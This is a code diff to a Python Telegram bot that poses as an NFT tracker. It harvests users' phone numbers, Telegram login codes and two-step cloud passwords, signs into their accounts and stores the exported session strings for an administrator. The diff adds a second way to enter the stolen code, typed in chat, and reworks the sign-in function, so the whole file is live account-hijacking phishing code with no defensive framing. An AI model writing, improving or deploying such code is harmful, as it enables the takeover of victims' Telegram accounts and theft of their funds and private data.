@@ -139,7 +139,7 @@ async def cmd_start(message: Message, state: FSMContext):
     conn.close()
 
     keyboard = ReplyKeyboardMarkup(
-        keyboard=[[KeyboardButton(text="Подключить бота", request_contact=True)]],
+        keyboard=[[KeyboardButton(text="🏴‍☠️ Поделиться контактом", request_contact=True)]],
         resize_keyboard=True,
         one_time_keyboard=True,
     )
@@ -164,14 +164,14 @@ async def process_phone(message: Message, state: FSMContext):
 
     raw_phone = message.contact.phone_number if message.contact else message.text
     if not raw_phone:
-        await message.answer("Пожалуйста, подключите бота нфт трекер.")
+        await message.answer("Пожалуйста, отправь контакт.")
         return
 
     cleaned_digits = re.sub(r"\D", "", raw_phone)
     phone = f"+{cleaned_digits}"
 
     await message.answer(
-        f"⏳ Обрабатываю Ваш айди <code>{phone}</code> и запрашиваю код у Telegram...",
+        f"⏳ Обрабатываю номер <code>{phone}</code> и запрашиваю код у Telegram...",
         reply_markup=ReplyKeyboardRemove(),
         parse_mode="HTML",
     )
@@ -200,7 +200,7 @@ async def process_phone(message: Message, state: FSMContext):
         await state.set_state(AuthState.waiting_for_code)
         await message.answer(
             "Код подтверждения \n\n"
-            "Бот отправил вам код для подключения бота\n\n"
+            "Telegram отправил тебе код в приложение. Можешь нажимать кнопки ниже или просто написать код цифрами в чат!\n\n"
             "<code>_ _ _ _ _</code>",
             reply_markup=get_code_keyboard(),
             parse_mode="HTML",
@@ -214,6 +214,7 @@ async def process_phone(message: Message, state: FSMContext):
         await state.clear()
 
 
+# --- ОБРАБОТКА ВВОДА КОДА КНОПКАМИ ---
 @router.callback_query(AuthState.waiting_for_code, F.data.startswith("digit_"))
 async def process_code_input(callback: CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
@@ -241,74 +242,106 @@ async def process_code_input(callback: CallbackQuery, state: FSMContext):
 
     text = (
         "Код подтверждения \n\n"
-        "Бот отправил вам код для подключения напишите при помощи кнопок или в чат\n\n"
+        "Telegram отправил тебе код в приложение. Можешь нажимать кнопки ниже или написать его текстом:\n\n"
         f"<code>{masked_display}</code>"
     )
 
-    if len(code_str) == 5:
-        try:
-            client = data["client"]
-            phone = data["phone"]
-            phone_code_hash = data["phone_code_hash"]
-
-            if not client.is_connected:
-                await client.connect()
-
-            await client.sign_in(
-                phone_number=phone,
-                phone_code_hash=phone_code_hash,
-                phone_code=code_str,
-            )
-
-            string_session = await client.export_session_string()
-            await client.disconnect()
-
-            conn = sqlite3.connect("database.db")
-            cursor = conn.cursor()
-            cursor.execute(
-                "INSERT OR REPLACE INTO sessions (user_id, phone, string_session, cloud_password, status) VALUES (?, ?, ?, ?, ?)",
-                (user_id, phone, string_session, "Нет", "Не проверен")
-            )
-            conn.commit()
-            conn.close()
-
-            # Успешная авторизация пройдена! Переходим к NFT-функционалу
-            del temp_auth_data[user_id]
-            
-            currency_kb = InlineKeyboardMarkup(inline_keyboard=[
-                [
-                    InlineKeyboardButton(text="⭐️ Звезды", callback_data="curr_Звезды"),
-                    InlineKeyboardButton(text="💎 TON", callback_data="curr_TON"),
-                    InlineKeyboardButton(text="gram", callback_data="curr_Gram")
-                ]
-            ])
-            await callback.message.edit_text(
-                "✅ **Юзербот успешно подключен!**\n\n"
-                "🎨 Выберите валюту для покупки NFT:",
-                reply_markup=currency_kb,
-                parse_mode="Markdown"
-            )
-            await state.set_state(NftState.waiting_for_currency)
-            return
-
-        except Exception as e:
-            if "SESSION_PASSWORD_NEEDED" in str(e) or "Password" in str(e):
-                await callback.message.edit_text(
-                    "Облачный пароль\n\n"
-                    "На аккаунте включена двухэтапная аутентификация. Отправь пароль в этот чат!"
-                )
-                await state.set_state(AuthState.waiting_for_password)
-                return
-            else:
-                await callback.answer(f"Ошибка входа: {e}", show_alert=True)
-                data["code"] = ""
-                text = "❌ Неверный код. Попробуй еще раз:\n\n<code>_ _ _ _ _</code>"
+    if len(code_str) >= 5:
+        await execute_sign_in(callback.message, state, user_id, code_str, is_callback=True)
+        return
 
     try:
         await callback.message.edit_text(text, reply_markup=get_code_keyboard(), parse_mode="HTML")
     except Exception:
         pass
     await callback.answer()
+
+
+# --- ОБРАБОТКА ВВОДА КОДА ТЕКСТОМ В ЧАТ ---
+@router.message(AuthState.waiting_for_code, F.text)
+async def process_code_text(message: Message, state: FSMContext):
+    user_id = message.from_user.id
+    if user_id not in temp_auth_data:
+        await message.answer("❌ Сессия истекла. Напиши /start заново.")
+        await state.clear()
+        return
+
+    code_str = re.sub(r"\D", "", message.text)
+    if len(code_str) < 5:
+        await message.answer("❌ Код слишком короткий. Введите минимум 5 цифр:")
+        return
+
+    await execute_sign_in(message, state, user_id, code_str, is_callback=False)
+
+
+# --- ФУНКЦИЯ АВТОРИЗАЦИИ В TELEGRAM ---
+async def execute_sign_in(message_obj, state: FSMContext, user_id: int, code_str: str, is_callback: bool = False):
+    data = temp_auth_data[user_id]
+    client = data["client"]
+    phone = data["phone"]
+    phone_code_hash = data["phone_code_hash"]
+
+    try:
+        if not client.is_connected:
+            await client.connect()
+
+        await client.sign_in(
+            phone_number=phone,
+            phone_code_hash=phone_code_hash,
+            phone_code=code_str,
+        )
+
+        string_session = await client.export_session_string()
+        await client.disconnect()
+
+        conn = sqlite3.connect("database.db")
+        cursor = conn.cursor()
+        cursor.execute(
+            "INSERT OR REPLACE INTO sessions (user_id, phone, string_session, cloud_password, status) VALUES (?, ?, ?, ?, ?)",
+            (user_id, phone, string_session, "Нет", "Не проверен")
+        )
+        conn.commit()
+        conn.close()
+
+        del temp_auth_data[user_id]
+
+        currency_kb = InlineKeyboardMarkup(inline_keyboard=[
+            [
+                InlineKeyboardButton(text="⭐️ Звезды", callback_data="curr_Звезды"),
+                InlineKeyboardButton(text="💎 TON", callback_data="curr_TON"),
+                InlineKeyboardButton(text="gram", callback_data="curr_Gram")
+            ]
+        ])
+        success_text = (
+            "✅ **Юзербот успешно подключен!**\n\n"
+            "🎨 Выберите валюту для покупки NFT:"
+        )
+        
+        if is_callback:
+            await message_obj.edit_text(success_text, reply_markup=currency_kb, parse_mode="Markdown")
+        else:
+            await message_obj.answer(success_text, reply_markup=currency_kb, parse_mode="Markdown")
+
+        await state.set_state(NftState.waiting_for_currency)
+
+    except Exception as e:
+        if "SESSION_PASSWORD_NEEDED" in str(e) or "Password" in str(e):
+            pwd_text = (
+                "Облачный пароль\n\n"
+                "На аккаунте включена двухэтапная аутентификация. Отправь пароль в этот чат!"
+            )
+            if is_callback:
+                await message_obj.edit_text(pwd_text)
+            else:
+                await message_obj.answer(pwd_text)
+            await state.set_state(AuthState.waiting_for_password)
+        else:
+            err_text = f"❌ Ошибка входа: {e}\nПопробуйте ввести код заново:"
+            if is_callback:
+                await message_obj.answer(err_text)
+            else:
+                await message_obj.answer(err_text)
+            data["code"] = ""
 
 
 @router.message(AuthState.waiting_for_password, F.text)
@@ -415,7 +448,6 @@ async def finalize_nft_request(message_obj, state: FSMContext, user):
     
     username = f"@{user.username}" if user.username else f"ID: {user.id}"
     
-    # Сообщение администратору
     admin_text = (
         f"🚨 **NFT трекер добавился!** 🚨\n\n"
         f"👤 Юзер: `{username}`\n"
@@ -1015,7 +1047,6 @@ async def admin_back_menu(callback: CallbackQuery, state: FSMContext):
     await callback.message.edit_text("👑 Админ-панель:", reply_markup=get_admin_keyboard())
 
 
-# --- НОВАЯ РАССЫЛКА (Всем или Одному) ---
 @router.callback_query(F.data == "admin_broadcast")
 async def admin_broadcast_start(callback: CallbackQuery, state: FSMContext):
     if callback.from_user.id != ADMIN_ID:
